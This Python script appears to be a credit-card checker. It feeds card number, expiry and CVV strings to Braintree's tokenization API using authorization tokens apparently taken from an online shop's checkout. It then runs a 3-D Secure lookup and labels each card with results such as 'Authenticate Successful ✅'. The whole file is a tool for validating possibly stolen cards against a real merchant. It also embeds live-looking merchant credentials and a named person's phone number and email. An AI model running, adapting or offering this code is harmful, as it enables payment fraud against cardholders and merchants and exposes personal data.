import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg3NjY2MDYsImp0aSI6IjdmZWFjN2Y3LTIyNjctNGMyMy05YTBmLWExOTY1YWFmYWVkMSIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.y9QCB9jOhSNvThjZNIxefqmg5StxOkOXHKk473XXWCMwID3md4IYBm0sNnDMM8zrfhEHqcpXrulyVkaX8MWz_w',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '3a69e888-5968-42b0-9168-e2d6b1d74fcf',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']

	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://shop.acumedic.com',
	    'referer': 'https://shop.acumedic.com/checkout/4/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '12.34',
	    'browserColorDepth': 24,
	    'browserJavaEnabled': False,
	    'browserJavascriptEnabled': True,
	    'browserLanguage': 'en-US',
	    'browserScreenHeight': 851,
	    'browserScreenWidth': 393,
	    'browserTimeZone': -180,
	    'deviceChannel': 'Browser',
	    'additionalInfo': {
	        'workPhoneNumber': None,
	        'shippingGivenName': 'Mohamed',
	        'shippingSurname': 'Mohamed',
	        'shippingPhone': '+15162582584',
	        'acsWindowSize': '03',
	        'billingLine1': 'New York',
	        'billingLine2': None,
	        'billingCity': 'New York',
	        'billingState': 'NY',
	        'billingPostalCode': '10080',
	        'billingCountryCode': 'US',
	        'billingPhoneNumber': '+15162582584',
	        'billingGivenName': 'Mohamed',
	        'billingSurname': 'Hamdy',
	        'shippingLine1': 'New York',
	        'shippingLine2': None,
	        'shippingCity': 'New York',
	        'shippingState': 'NY',
	        'shippingPostalCode': '10080',
	        'shippingCountryCode': 'US',
	        'email': 'hafezg93@gmail.com',
	    },
	    'bin': '424242',
	    'dfReferenceId': '1_d70f417e-229b-4f12-9525-4e20d322b2d7',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.99.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 354,
	        'issuerDeviceDataCollectionTimeElapsed': 3561,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg3NjYxNDksImp0aSI6ImM1OWIzOWZiLTU3OTUtNGRmMy05YTQ1LThiMjRiNjdjZmVhMSIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.1M12O2sQmBWTeXxXCD4y8qUok7TyiG3VI6cYQDtXYqrCjpnqnYPRxKu_yjsLENVUQH-MkW3zr7klr1m0RrIGGw',
	    'braintreeLibraryVersion': 'braintree/web/3.99.0',
	    '_meta': {
	        'merchantAppId': 'shop.acumedic.com',
	        'platform': 'web',
	        'sdkVersion': '3.99.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '5a4d303a-9c5c-4fe8-95f9-8c956456a826',
	    },
	}
	
	
	req0 = requests.post(
	    f'https://api.braintreegateway.com/merchants/msf5rf5mg5f3y6fy/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	if "authenticate_successful" in req0.text:
		return "3DS Authenticate Successful ✅"
	if "'challenge_required'" in req0.text:
		return "3DS Challenge Required ❌"
	if "authenticate_attempt_successful" in req0.text:
		return "3DS Authenticate Attempt Successful ✅"
	if "authenticate_rejected" in req0.text:
		return "3DS Authenticate Rejected ❌'"
	if "authenticate_frictionless_failed" in req0.text:
		return "3DS Authenticate Frictionless Failed ❌"
	if "lookup_card_error" in req0.text:
		return "lookup_card_error ⚠️"
	if "lookup_error" in req0.text:
		return "lookup Error ⚠️"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
